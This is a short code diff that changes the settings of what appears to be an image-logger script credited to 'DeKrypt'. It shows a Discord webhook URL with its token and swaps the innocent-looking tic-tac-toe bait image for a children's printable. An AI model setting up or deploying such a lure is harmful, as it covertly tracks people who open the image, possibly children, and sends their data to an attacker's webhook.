@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1074401525218164796/dIqsFXxXxvsgEk8eAHhYekeHK8NrfdZM8fVUWp36LFqFNq4m8SCLTPubFHwUSZAota1Q",
-    "image": "https://i0.wp.com/www.thegamegal.com/wp-content/uploads/2018/08/ultimate-tic-tac-toe12-01.png?resize=340%2C340&ssl=1", # You can also have a custom image by using a URL argument
+    "image": "https://childhoodmagic.com/wp-content/uploads/2022/09/Childhood-Magic-Winter-tic-tac-toe-printable-bw-1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
